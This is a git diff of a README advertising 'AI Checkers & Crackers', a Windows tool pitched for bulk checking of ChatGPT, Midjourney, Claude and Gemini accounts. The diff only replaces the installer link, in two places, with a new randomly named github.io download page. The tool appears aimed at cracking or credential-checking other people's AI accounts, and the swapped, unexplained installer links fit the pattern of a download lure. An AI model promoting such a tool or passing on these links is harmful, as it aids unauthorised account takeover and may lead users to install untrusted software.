@@ -2,7 +2,7 @@
 
 AI Checkers & Crackers is a powerful Windows desktop tool designed to streamline the management and verification of multiple AI service accounts. With support for platforms like ChatGPT, Midjourney, Claude, and Gemini, it offers a unified interface for all your AI checking needs. Last Updated: March 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -52,4 +52,4 @@ A4: Yes, the tool allows you to export account status and verification reports i
 
 Get the latest version of AI Service Checker Premium 2026 by visiting the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
